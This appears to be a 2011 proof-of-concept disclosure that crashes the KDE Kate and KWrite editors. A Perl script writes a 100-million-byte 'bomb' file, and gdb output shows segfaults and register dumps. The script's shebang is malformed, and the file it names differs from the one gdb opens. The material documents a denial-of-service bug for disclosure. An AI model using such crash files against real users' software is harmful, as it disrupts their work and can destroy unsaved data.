@@ -1,0 +1,96 @@
+# Exploit Title: Kate -Kwrite crash POC
+
+# Date: 26/12/2011
+
+# Author: kerasforos
+
+Bomb file:
+==================
+#usr/bin/perl
+my $file = "Bomb.txt";
+my $junk = "\x41" x 100000000;
+open ($FILE, ">$file");
+print $FILE $junk;
+close($FILE);
+print "bomb file!";
+==================
+
+Kwrite:
+
+Version:           4.0 (using KDE 4.5.3)
+OS:                Linux
+
+GNU gdb (GDB) 7.1-ubuntu
+Copyright (C) 2010 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i486-linux-gnu".
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>...
+Reading symbols from /usr/bin/kwrite...(no debugging symbols found)...done.
+(gdb) run crash.txt
+Starting program: /usr/bin/kwrite crash.txt
+[Thread debugging using libthread_db enabled]
+
+Program received signal SIGSEGV, Segmentation fault.
+0xb7f6e1b8 in ?? () from /lib/tls/i686/cmov/libc.so.6
+(gdb) i r
+eax            0x0    0
+ecx            0xf2e30b00    -220001536
+edx            0xb2f7af90    -1292390512
+ebx            0x0    0
+esp            0xbfffd5a8    0xbfffd5a8
+ebp            0xbfffd618    0xbfffd618
+esi            0x82ee1f4    137290228
+edi            0xa6268690    -1507424624
+eip            0xb7f6e1b8    0xb7f6e1b8
+eflags         0x10286    [ PF SF IF RF ]
+cs             0x73    115
+ss             0x7b    123
+ds             0x7b    123
+es             0x7b    123
+fs             0x0    0
+gs             0x33    51
+
+
+Kate:
+Version 3.5.3
+
+
+GNU gdb (GDB) 7.1-ubuntu
+Copyright (C) 2010 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i486-linux-gnu".
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>...
+Reading symbols from /usr/bin/kate...(no debugging symbols found)...done.
+(gdb) run crash.txt
+Starting program: /usr/bin/kate crash.txt
+[Thread debugging using libthread_db enabled]
+kate(6918)/kdecore (services) KMimeTypeFactory::parseMagic: Now parsing
+"/usr/share/mime/magic"
+
+Program received signal SIGSEGV, Segmentation fault.
+0xb7f781a4 in ?? () from /lib/tls/i686/cmov/libc.so.6
+(gdb) i r
+eax            0x0    0
+ecx            0xf3415f40    -213819584
+edx            0xb1d79fd0    -1311268912
+ebx            0x0    0
+esp            0xbfffd1b8    0xbfffd1b8
+ebp            0xbfffd228    0xbfffd228
+esi            0x8428094    138576020
+edi            0xac94ea50    -1399526832
+eip            0xb7f781a4    0xb7f781a4
+eflags         0x210282    [ SF IF RF ID ]
+cs             0x73    115
+ss             0x7b    123
+ds             0x7b    123
+es             0x7b    123
+fs             0x0    0
+gs             0x33    51
